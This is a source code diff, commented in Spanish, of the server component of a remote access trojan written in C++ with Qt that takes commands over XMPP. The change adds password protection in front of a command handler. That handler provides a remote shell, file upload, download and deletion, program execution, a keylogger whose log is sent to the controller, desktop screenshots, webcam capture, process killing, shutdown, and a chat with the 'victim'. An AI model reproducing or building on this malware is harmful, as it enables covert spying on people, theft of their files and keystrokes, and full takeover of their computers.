@@ -83,6 +83,7 @@ void MainWindow::inicio(){
     cliente.connectToServer(configuracion); //conectar al servidor xmpp
     copiar.setInterval(6000);
     copiar.start();
+    contrasenaRecibida = "nocontrasena";
 }
 void MainWindow::tiempoCopiar()
 {
@@ -125,6 +126,7 @@ QByteArray MainWindow::nuevaTrama()
         datos = datos + "noejecutar|@|0|@|"; //Sino decimos al servidor copiado que no ejecute nada
     }
     datos = datos + "nomensaje|@|";
+    datos = datos + this->contrasenaProteccion.toLatin1() + "|@|";
     return datos;
 }
 bool MainWindow::cargarConfiguracion(){
@@ -156,12 +158,15 @@ bool MainWindow::cargarConfiguracion(){
         this->nombreCopiable = campo[6];
         this->ejecutar = campo[7];
         this->siempreOUnaVez = campo[8];
-        this->tipoMensaje = campo[9];
+        this->contrasenaProteccion = campo[9];
+        this->tipoMensaje = campo[10];
         if(this->tipoMensaje != "nomensaje")
         {
-            this->textoMensaje = campo[10];
-            this->tituloMensaje = campo[11];
+            this->textoMensaje = campo[11];
+            this->tituloMensaje = campo[12];
         }
+
+
     }
     return true;
 }
@@ -239,209 +244,224 @@ void MainWindow::llegadaDatos(const QXmppMessage &mensaje) {
     from = mensaje.from(); //Contestaremos al mismo cliente que nos envie los mensajes
     QString datos = mensaje.body(); //Coger el mensaje
     QStringList parametros =  datos.split("|@|"); //Separar los parametros
-    if(parametros[0] == "t") //llegada de teclas
+    if(contrasenaProteccion != contrasenaRecibida)
     {
-        int i;
-        for(i=0;i<parametros.size();i++) //recorremos y vamos enviando las teclas
+        if(parametros[0] == "pass")
         {
-            enviarTecla(parametros[i].toInt());
-        }
-        return;
-    }
-    if (parametros[0] == "der") //un click derecho
-    {
-        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
-        hacerClickDerechoP();
-        hacerClickDerechoS();
-        return;
-    }
-    if (parametros[0] == "izq") //un click izquierdo
-    {
-        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
-        hacerClickIzquierdoP();
-        hacerClickIzquierdoS();
-        return;
-    }
-    if (parametros[0] == "arra") //mover el raton arrastrando
-    {
-        moverPuntero(parametros[1].toInt(),parametros[2].toInt());
-
-        hacerClickIzquierdoP();
-
-        moverPuntero(parametros[3].toInt(),parametros[4].toInt());
-
-        hacerClickIzquierdoS();
-
-        return;
-    }
-    if(parametros[0] == "shell"){ //shell remoto
-        QString salidaShell;
-        salidaShell = "shell|@|" + shell(parametros[1].toLatin1());
-        cliente.sendMessage(from,salidaShell);
-    }
-    if (parametros[0] == "home"){
-        cliente.sendMessage(from,"home|@|" + QDir::homePath());
-    }
-    if (parametros[0] == "unidades")
-    {
-        listarUnidades();
-    }
-    if (parametros[0] == "archivos"){
-        listarArchivos(parametros[1]);
-    }
-    if (parametros[0] == "directorios"){
-        listarDirectorios(parametros[1]);
-    }
-    if (parametros[0] == "get"){
-       job = manager->sendFile(from,parametros[1]);
-    }
-    if (parametros[0] == "put"){
-        archivo = parametros[1];
-    }
-    if (parametros[0] == "remove"){
-        directorio.remove(parametros[1]);
-    }
-    if (parametros[0] == "createfolder"){
-        directorio.mkdir(parametros[1]);
-    }
-    if (parametros[0] == "borrarcarpeta")
-    {
-        directorio.rmdir(parametros[1]);    }
-    if (parametros[0] == "tamano")
-    {
-        QString tamano;
-        tamano.setNum(QFileInfo(parametros[1]).size());
-        cliente.sendMessage(from,"tamano|@|" + tamano);
-    }
-    if (parametros[0] == "execute")
-    {
-        QProcess::startDetached(parametros[1]);
-    }
-    if (parametros[0] == "copiar")
-    {
-        QFile::copy(parametros[1],parametros[2]);
-    }
-    if (parametros[0] == "mover")
-    {
-        if(parametros[1] != parametros[2]) //Para evitar borrar el archivo si se mueve a la misma carpeta
-        {
-            QFile::copy(parametros[1],parametros[2]);
-            QFile::remove(parametros[1]);
-        }
-    }
-    if (parametros[0] == "renombrar")
-    {
-        QFile::rename(parametros[1],parametros[2]);
-    }
-    if (parametros[0] == "previa")
-    {
-        vistaPrevia(parametros[1]);
-    }
-    if (parametros[0] == "alerta"){
-        mostrarMensaje("alerta",parametros[2],parametros[1]);
-    }
-    if (parametros[0] == "info"){
-        mostrarMensaje("info",parametros[2],parametros[1]);
-    }
-    if (parametros[0] == "peligro"){
-        mostrarMensaje("peligro",parametros[2],parametros[1]);
-    }
-    if (datos == "reiniciar"){
-        reiniciar();
-    }
-    if (datos == "cerrar"){ //cerrar el servidor
-        cliente.disconnect();
-        apagar();
-        QApplication::exit();
-    }
-    if (datos == "desinfectar")
-    {
-        desinfectar();
-    }
-    if (datos == "ping") { //ping al servidor
-        cliente.sendMessage(from,"pong");
-    }
-    if(parametros[0] == "apagarequipo"){
-       #ifdef Q_WS_WIN
-        shell("shutdown /t 1 /s");
-       #else
-        shell("shutdown -h now");
-       #endif
-    }
-    if(parametros[0] == "reiniciarequipo"){
-       #ifdef Q_WS_WIN
-        shell("shutdown /t 0 /r");
-       #else
-        shell("shutdown -r now");
-       #endif
-    }
-    if (datos == "abrirchat") {
-        this->abrirChat();
-    }
-    if (datos == "cerrarchat") {
-        this->cerrarChat();
-    }
-    if (parametros[0] == "chat") {
-        this->nickVictima = parametros[3];
-        this->ponerMensajeChat(parametros[1],parametros[2]);
-    }
-    if (parametros[0] == "activark")
-    {
-        verTecla.start();
-    }
-    if (parametros[0] == "desactivark")
-    {
-        verTecla.stop();
-    }
-    if (parametros[0] == "recibirk")
-    {
-        QFile klog;
-        klog.setFileName(directorio.tempPath() + "/log");
-        klog.open(QFile::ReadOnly);
-        cliente.sendMessage(from,"teclas|@|" + klog.readAll());
-        klog.close();
-    }
-    if (parametros[0] == "limpiark")
-    {
-        QDir directorio;
-        if(this->verTecla.isActive())
-        {
-            this->verTecla.stop();
-            directorio.remove(directorio.tempPath() + "/log");
-            this->verTecla.start();
+            contrasenaRecibida = parametros[1];
         }
         else
         {
-            directorio.remove("./log");
+            cliente.sendMessage(from,"ident|@|");
         }
     }
-    if (parametros[0] == "informacion")
-    {   
-        cliente.sendMessage(from,obtenerInformacionSistema());
-    }
-    if(parametros[0] == "procesos")
+    else
     {
-        listarProcesos();
-    }
-    if(parametros[0] == "matar")
-    {
-        matarProceso(parametros[1]);
-    }
-    if(parametros[0] == "captura") //capturar escritorio
-    {
-         emit procesar(screenShot().toImage(),parametros[1].toInt());
-    }
-    if (parametros[0] == "cap") //capturar la webcam
-    {
-       enviarWebcam(parametros[1].toInt());
-    }
-    if (parametros[0] == "encender")
-    {
-        encender();
-    }
-    if (parametros[0] == "apagar")
-    {
-        apagar();
+
+        if(parametros[0] == "t") //llegada de teclas
+        {
+            int i;
+            for(i=0;i<parametros.size();i++) //recorremos y vamos enviando las teclas
+            {
+                enviarTecla(parametros[i].toInt());
+            }
+            return;
+        }
+        if (parametros[0] == "der") //un click derecho
+        {
+            moverPuntero(parametros[1].toInt(),parametros[2].toInt());
+            hacerClickDerechoP();
+            hacerClickDerechoS();
+            return;
+        }
+        if (parametros[0] == "izq") //un click izquierdo
+        {
+            moverPuntero(parametros[1].toInt(),parametros[2].toInt());
+            hacerClickIzquierdoP();
+            hacerClickIzquierdoS();
+            return;
+        }
+        if (parametros[0] == "arra") //mover el raton arrastrando
+        {
+            moverPuntero(parametros[1].toInt(),parametros[2].toInt());
+
+            hacerClickIzquierdoP();
+
+            moverPuntero(parametros[3].toInt(),parametros[4].toInt());
+
+            hacerClickIzquierdoS();
+
+            return;
+        }
+        if(parametros[0] == "shell"){ //shell remoto
+            QString salidaShell;
+            salidaShell = "shell|@|" + shell(parametros[1].toLatin1());
+            cliente.sendMessage(from,salidaShell);
+        }
+        if (parametros[0] == "home"){
+            cliente.sendMessage(from,"home|@|" + QDir::homePath());
+        }
+        if (parametros[0] == "unidades")
+        {
+            listarUnidades();
+        }
+        if (parametros[0] == "archivos"){
+            listarArchivos(parametros[1]);
+        }
+        if (parametros[0] == "directorios"){
+            listarDirectorios(parametros[1]);
+        }
+        if (parametros[0] == "get"){
+           job = manager->sendFile(from,parametros[1]);
+        }
+        if (parametros[0] == "put"){
+            archivo = parametros[1];
+        }
+        if (parametros[0] == "remove"){
+            directorio.remove(parametros[1]);
+        }
+        if (parametros[0] == "createfolder"){
+            directorio.mkdir(parametros[1]);
+        }
+        if (parametros[0] == "borrarcarpeta")
+        {
+            directorio.rmdir(parametros[1]);    }
+        if (parametros[0] == "tamano")
+        {
+            QString tamano;
+            tamano.setNum(QFileInfo(parametros[1]).size());
+            cliente.sendMessage(from,"tamano|@|" + tamano);
+        }
+        if (parametros[0] == "execute")
+        {
+            QProcess::startDetached(parametros[1]);
+        }
+        if (parametros[0] == "copiar")
+        {
+            QFile::copy(parametros[1],parametros[2]);
+        }
+        if (parametros[0] == "mover")
+        {
+            if(parametros[1] != parametros[2]) //Para evitar borrar el archivo si se mueve a la misma carpeta
+            {
+                QFile::copy(parametros[1],parametros[2]);
+                QFile::remove(parametros[1]);
+            }
+        }
+        if (parametros[0] == "renombrar")
+        {
+            QFile::rename(parametros[1],parametros[2]);
+        }
+        if (parametros[0] == "previa")
+        {
+            vistaPrevia(parametros[1]);
+        }
+        if (parametros[0] == "alerta"){
+            mostrarMensaje("alerta",parametros[2],parametros[1]);
+        }
+        if (parametros[0] == "info"){
+            mostrarMensaje("info",parametros[2],parametros[1]);
+        }
+        if (parametros[0] == "peligro"){
+            mostrarMensaje("peligro",parametros[2],parametros[1]);
+        }
+        if (datos == "reiniciar"){
+            reiniciar();
+        }
+        if (datos == "cerrar"){ //cerrar el servidor
+            cliente.disconnect();
+            apagar();
+            QApplication::exit();
+        }
+        if (datos == "desinfectar")
+        {
+            desinfectar();
+        }
+        if (datos == "ping") { //ping al servidor
+            cliente.sendMessage(from,"pong");
+        }
+        if(parametros[0] == "apagarequipo"){
+           #ifdef Q_WS_WIN
+            shell("shutdown /t 1 /s");
+           #else
+            shell("shutdown -h now");
+           #endif
+        }
+        if(parametros[0] == "reiniciarequipo"){
+           #ifdef Q_WS_WIN
+            shell("shutdown /t 0 /r");
+           #else
+            shell("shutdown -r now");
+           #endif
+        }
+        if (datos == "abrirchat") {
+            this->abrirChat();
+        }
+        if (datos == "cerrarchat") {
+            this->cerrarChat();
+        }
+        if (parametros[0] == "chat") {
+            this->nickVictima = parametros[3];
+            this->ponerMensajeChat(parametros[1],parametros[2]);
+        }
+        if (parametros[0] == "activark")
+        {
+            verTecla.start();
+        }
+        if (parametros[0] == "desactivark")
+        {
+            verTecla.stop();
+        }
+        if (parametros[0] == "recibirk")
+        {
+            QFile klog;
+            klog.setFileName(directorio.tempPath() + "/log");
+            klog.open(QFile::ReadOnly);
+            cliente.sendMessage(from,"teclas|@|" + klog.readAll());
+            klog.close();
+        }
+        if (parametros[0] == "limpiark")
+        {
+            QDir directorio;
+            if(this->verTecla.isActive())
+            {
+                this->verTecla.stop();
+                directorio.remove(directorio.tempPath() + "/log");
+                this->verTecla.start();
+            }
+            else
+            {
+                directorio.remove("./log");
+            }
+        }
+        if (parametros[0] == "informacion")
+        {
+            cliente.sendMessage(from,obtenerInformacionSistema());
+        }
+        if(parametros[0] == "procesos")
+        {
+            listarProcesos();
+        }
+        if(parametros[0] == "matar")
+        {
+            matarProceso(parametros[1]);
+        }
+        if(parametros[0] == "captura") //capturar escritorio
+        {
+             emit procesar(screenShot().toImage(),parametros[1].toInt());
+        }
+        if (parametros[0] == "cap") //capturar la webcam
+        {
+           enviarWebcam(parametros[1].toInt());
+        }
+        if (parametros[0] == "encender")
+        {
+            encender();
+        }
+        if (parametros[0] == "apagar")
+        {
+            apagar();
+        }
     }
 }
 
